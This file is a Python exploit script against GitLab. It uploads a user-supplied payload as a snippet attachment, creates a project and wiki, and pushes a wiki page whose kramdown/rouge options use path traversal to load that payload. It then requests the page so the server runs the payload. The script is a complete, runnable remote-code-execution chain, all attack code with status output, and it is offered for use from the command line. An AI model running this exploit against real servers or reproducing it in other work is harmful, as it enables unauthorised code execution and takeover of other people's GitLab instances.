#!/usr/bin/env python3

from bs4 import BeautifulSoup
import http.client as httplib
import json
import mimetypes
import ntpath
import os
import re
import shutil
import subprocess
import sys
import urllib


USER = "root"

def http_request_get_csrf_token(conn, method: str, resource: str, cookies) -> str:
	headers = {"Cookie": cookies, "Connection": "keep-alive"}
	conn.request(method, resource, "", headers)
	response = conn.getresponse()
	soup = BeautifulSoup(response.read().decode("utf-8"), features="html.parser")
	metas = soup.find_all('meta')
	csrf_token = [meta.attrs['content'] for meta in metas if 'name' in meta.attrs and meta.attrs['name'] == 'csrf-token']

	return csrf_token[0]

def http_request(conn, method: str, resource: str, cookies: str, csrf_token: str, content, content_type = "application/x-www-form-urlencoded"):
	params = content #urllib.parse.urlencode(content)
	headers = {"Cookie": cookies, "X-CSRF-Token": csrf_token, "Content-Type": content_type}
	conn.request(method, resource, params, headers)
	return conn.getresponse()

def get_content_type(filename):
	return mimetypes.guess_type(filename)[0] or 'application/octet-stream'

def encode_multipart_formdata(fields, files):
	BOUNDARY = '----------ThIs_Is_tHe_bouNdaRY_$'
	CRLF = '\r\n'
	L = []
	for (key, value) in fields:
		L.append('--' + BOUNDARY)
		L.append('Content-Disposition: form-data; name="%s"' % key)
		L.append('')
		L.append(value)
	for (key, filename, value) in files:
		L.append('--' + BOUNDARY)
		L.append('Content-Disposition: form-data; name="%s"; filename="%s"' % (key, ntpath.basename(filename)))
		L.append('Content-Type: %s' % get_content_type(filename))
		L.append('')
		L.append(value)
	L.append('--' + BOUNDARY + '--')
	L.append('')
	body = CRLF.join(L)
	content_type = 'multipart/form-data; boundary=%s' % BOUNDARY
	return content_type, body

def http_request_upload(conn, resource: str, cookies: str, csrf_token: str, filename: str):
	content = ""
	with open(filename, "rb") as f:
		content = f.read().decode("utf-8")
	content_type, body = encode_multipart_formdata([], [("file", filename, content)])
	headers = {
		"Cookie": cookies,
		"Content-Type": content_type,
		"Accept": "application/json",
		"X-CSRF-Token": csrf_token,
		"Connection": "keep-alive"
	}
	conn.request("POST", resource, body, headers)
	return conn.getresponse()

def init_connection(server: str):
	return httplib.HTTPConnection(server)

def create_snippet(server: str, cookies: str, payload: str):
	print("\033[36m*** CREATE SNIPPET ***\033[39m")
	# Get CSRF token
	csrf_token = http_request_get_csrf_token(init_connection(server), "GET", "/-/snippets/new", cookies)
	print("[  \033[32mOK\033[39m  ] CSRF token got: "+csrf_token)

	# Upload payload
	response = http_request_upload(init_connection(server), "/uploads/user?id=1", cookies, csrf_token, payload)
	data = response.read()
	jdata = json.loads(data)
	if "link" in jdata:
		print("[  \033[32mOK\033[39m  ] Payload uploaded: "+jdata["link"]["url"])
	else:
		print("[  \033[31mKO\033[39m  ] Payload upload failed")
		os._exit(1)
	
	# Create new snippet
	response = http_request(init_connection(server), "POST", "/api/graphql", cookies, csrf_token, '[{"operationName":"CreateSnippet","variables":{"input":{"title":"Test","description":"[payload.rb]('+jdata["link"]["url"]+')","visibilityLevel":"private","blobActions":[{"action":"create","previousPath":"","content":"# Test","filePath":""}],"uploadedFiles":["'+jdata["link"]["url"]+'"],"projectPath":""}},"query":"mutation CreateSnippet($input: CreateSnippetInput!) {\\n  createSnippet(input: $input) {\\n	errors\\n	snippet {\\n	  webUrl\\n	  __typename\\n	}\\n	needsCaptchaResponse\\n	captchaSiteKey\\n	__typename\\n  }\\n}\\n"}]', "application/json")
	if len(response.read().decode("utf-8")) > 0:
		print("[  \033[32mOK\033[39m  ] Snippet created")
	else:
		print("[  \033[31mKO\033[39m  ] Snippet creation failed")
		os._exit(1)
	return jdata["link"]["url"]

def create_project(server: str, cookies: str):
	print("\033[36m*** CREATE PROJECT ***\033[39m")
	# Get CSRF token
	csrf_token = http_request_get_csrf_token(init_connection(server), "GET", "/projects/new", cookies)
	print("[  \033[32mOK\033[39m  ] CSRF token got: "+csrf_token)

	# Request to create new project
	response = http_request(init_connection(server), "POST", "/projects", cookies+"; event_filter=all; sidebar_collapsed=false", "", "utf8=%E2%9C%93&authenticity_token="+urllib.parse.quote_plus(csrf_token)+"&project%5Bci_cd_only%5D=false&project%5Bname%5D=Test&project%5Bnamespace_id%5D=1&project%5Bpath%5D=test&project%5Bdescription%5D=&project%5Bvisibility_level%5D=0")
	print("[  \033[32mOK\033[39m  ] Project \"Test\" created")

def create_default_wiki_home_page(server: str, cookies: str):
	print("\033[36m*** CREATE DEFAULT WIKI HOME PAGE ***\033[39m")
	# Get CSRF token
	csrf_token = http_request_get_csrf_token(init_connection(server), "GET", "/root/test/-/wikis/home?view=create", cookies)
	print("[  \033[32mOK\033[39m  ] CSRF token got: "+csrf_token)

	# Request to create default wiki home page
	response = http_request(init_connection(server), "POST", "/root/test/-/wikis", cookies+"; event_filter=all; sidebar_collapsed=false", "", "utf8=%E2%9C%93&authenticity_token="+urllib.parse.quote_plus(csrf_token)+"&wiki%5Btitle%5D=home&wiki%5Bformat%5D=markdown&wiki%5Bcontent%5D=%23+Test&wiki%5Bmessage%5D=Create+home")
	print("[  \033[32mOK\033[39m  ] Default wiki home page created")

def create_wiki_runner(server: str, cookies: str, payload: str):
	print("\033[36m*** CREATE WIKI RUNNER ***\033[39m")
	p = subprocess.Popen(["git", "clone", "http://"+server+"/"+USER+"/test.wiki.git"])
	p.communicate()
	with open("./test.wiki/page1.rmd", 'w') as out:
		out.write('{::options syntax_highlighter="rouge" syntax_highlighter_opts="{formatter: Redis, driver: ../../../../../../../../../../var/opt/gitlab/gitlab-rails'+payload+'\}" /}\n~~~ ruby\ndef what?\n42\nend\n~~~')
	with open("./test.wiki/upload.sh", 'w') as out:
		out.write("cd $(dirname $0)\ngit add page1.rmd\ngit commit -m test\ngit push")
	p = subprocess.Popen(["bash", "./test.wiki/upload.sh"])
	p.communicate()
	shutil.rmtree("./test.wiki/")
	print("[  \033[32mOK\033[39m  ] Runner uploaded")

def execute_payload(server: str, cookies: str):
	print("\033[36m*** PAYLOAD EXECUTION ***\033[39m")
	response = http_request(init_connection(server), "GET", "/"+USER+"/test/-/wikis/page1", cookies+"; event_filter=all; sidebar_collapsed=false", "", "")
	#print(response.read())
	if response.status == 200:
		print("[  \033[32mOK\033[39m  ] Payload executed successfully !")
	else:
		print("[  \033[31mKO\033[39m  ] Payload cannot be executed ! Error: "+str(response.status))

def main():
	payload = create_snippet(sys.argv[1], sys.argv[3], sys.argv[2])
	create_project(sys.argv[1], sys.argv[3])
	create_default_wiki_home_page(sys.argv[1], sys.argv[3])
	create_wiki_runner(sys.argv[1], sys.argv[3], payload)
	execute_payload(sys.argv[1], sys.argv[3])

if len(sys.argv) < 4:
	print("Error: Too few arguments\r\nUsage: {} <server> <payload> <cookies>\r\n".format(sys.argv[0]))
elif len(sys.argv) > 4:
	print("Error: Too many arguments\r\nUsage: {} <server> <payload> <cookies>\r\nDid you forget to quote the cookie string ?".format(sys.argv[0]))
else:
	main()